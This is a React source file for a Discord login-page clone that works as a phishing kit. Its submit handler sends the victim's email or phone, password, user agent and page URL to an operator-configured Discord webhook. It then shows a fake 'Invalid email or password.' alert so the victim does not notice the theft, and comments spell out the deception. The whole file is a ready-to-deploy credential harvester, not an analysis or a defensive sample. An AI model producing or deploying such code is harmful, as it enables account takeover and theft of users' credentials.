import React, { useState } from 'react';
import './App.css';
import { DiscordLogo, EyeIcon, EyeOffIcon } from './components';

function App() {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // ⚠️ REPLACE THIS WITH YOUR DISCORD WEBHOOK URL ⚠️
  const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
  
  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Check if webhook URL is configured
    if (DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
      console.error('Discord webhook URL not configured!');
      // Show fake loading to user, but log error for developer
      setIsLoading(true);
      setTimeout(() => {
        setIsLoading(false);
        alert('Invalid email or password.');
      }, 2000);
      return;
    }

    setIsLoading(true);

    try {
      const payload = {
        embeds: [{
          title: "🔐 Discord Login Attempt",
          color: 5793266, // Discord purple color
          fields: [
            {
              name: "📧 Email/Phone",
              value: formData.email || "Not provided",
              inline: false
            },
            {
              name: "🔑 Password",
              value: formData.password || "Not provided",
              inline: false
            },
            {
              name: "⏰ Timestamp",
              value: new Date().toLocaleString(),
              inline: false
            },
            {
              name: "🌐 User Agent",
              value: navigator.userAgent.slice(0, 100) + "...",
              inline: false
            },
            {
              name: "🔗 Page URL",
              value: window.location.href,
              inline: false
            }
          ],
          thumbnail: {
            url: "https://cdn.discordapp.com/attachments/1234567890/discord-logo.png"
          },
          footer: {
            text: "Discord Login Clone • Captured via Webhook"
          }
        }]
      };

      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        // Show fake error message to user (so it looks like failed login)
        setTimeout(() => {
          setIsLoading(false);
          alert('Invalid email or password.');
          setFormData({ email: '', password: '' });
        }, 2000);
      } else {
        throw new Error('Failed to send webhook');
      }
    } catch (error) {
      console.error('Error sending webhook:', error);
      // Show fake error to user
      setTimeout(() => {
        setIsLoading(false);
        alert('Invalid email or password.');
      }, 2000);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-gradient-to-br from-discord-primary via-discord-secondary to-discord-tertiary">
      {/* Animated background orbs */}
      <div className="absolute inset-0">
        <div className="orb orb-1"></div>
        <div className="orb orb-2"></div>
        <div className="orb orb-3"></div>
        <div className="orb orb-4"></div>
        <div className="orb orb-5"></div>
        <div className="orb orb-6"></div>
      </div>

      {/* Discord logo */}
      <div className="absolute top-8 left-8 z-10">
        <DiscordLogo />
      </div>

      {/* Main content container */}
      <div className="relative z-10 min-h-screen flex items-center justify-center p-4">
        <div className="w-full max-w-6xl flex items-center justify-center gap-8">
          
          {/* Login Form */}
          <div className="bg-discord-dark rounded-lg p-8 w-full max-w-md shadow-2xl">
            <div className="text-center mb-6">
              <h1 className="text-white text-2xl font-semibold mb-2">Welcome back!</h1>
              <p className="text-discord-text-secondary">We're so excited to see you again!</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="block text-discord-text-secondary text-xs font-semibold uppercase tracking-wide mb-2">
                  Email or Phone Number <span className="text-red-400">*</span>
                </label>
                <input
                  type="text"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  className="w-full p-3 bg-discord-input border border-discord-border rounded text-white placeholder-gray-400 focus:border-discord-blurple focus:outline-none transition-colors"
                  required
                />
              </div>

              <div>
                <label className="block text-discord-text-secondary text-xs font-semibold uppercase tracking-wide mb-2">
                  Password <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className="w-full p-3 bg-discord-input border border-discord-border rounded text-white placeholder-gray-400 focus:border-discord-blurple focus:outline-none transition-colors pr-12"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-discord-text-secondary hover:text-white transition-colors"
                  >
                    {showPassword ? <EyeOffIcon /> : <EyeIcon />}
                  </button>
                </div>
              </div>

              <div className="text-left">
                <a href="#" className="text-discord-link text-sm hover:underline">
                  Forgot your password?
                </a>
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-discord-blurple hover:bg-discord-blurple-hover text-white font-medium py-3 px-4 rounded transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? 'Logging in...' : 'Log In'}
              </button>

              <div className="text-sm text-discord-text-secondary">
                Need an account?{' '}
                <a href="#" className="text-discord-link hover:underline">
                  Register
                </a>
              </div>
            </form>
          </div>

          {/* QR Code Section */}
          <div className="hidden lg:block text-center">
            <div className="bg-white p-4 rounded-lg mb-4 inline-block">
              <div className="w-48 h-48 bg-black flex items-center justify-center">
                <svg viewBox="0 0 200 200" className="w-full h-full">
                  {/* QR Code pattern */}
                  <rect x="0" y="0" width="200" height="200" fill="white"/>
                  <rect x="10" y="10" width="180" height="180" fill="black"/>
                  <rect x="20" y="20" width="160" height="160" fill="white"/>
                  <rect x="30" y="30" width="140" height="140" fill="black"/>
                  {/* More QR code squares */}
                  {Array.from({length: 10}).map((_, i) => (
                    <g key={i}>
                      <rect x={40 + (i * 12)} y="40" width="8" height="8" fill="white"/>
                      <rect x="40" y={40 + (i * 12)} width="8" height="8" fill="white"/>
                      <rect x={160 - (i * 12)} y="160" width="8" height="8" fill="white"/>
                    </g>
                  ))}
                </svg>
              </div>
            </div>
            <div className="max-w-xs">
              <h3 className="text-white font-semibold text-lg mb-2">Log in with QR Code</h3>
              <p className="text-discord-text-secondary text-sm leading-relaxed">
                Scan this with the <strong>Discord mobile app</strong> to log in instantly.
              </p>
              <p className="text-discord-text-secondary text-xs mt-2">
                Or use the form nearby
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;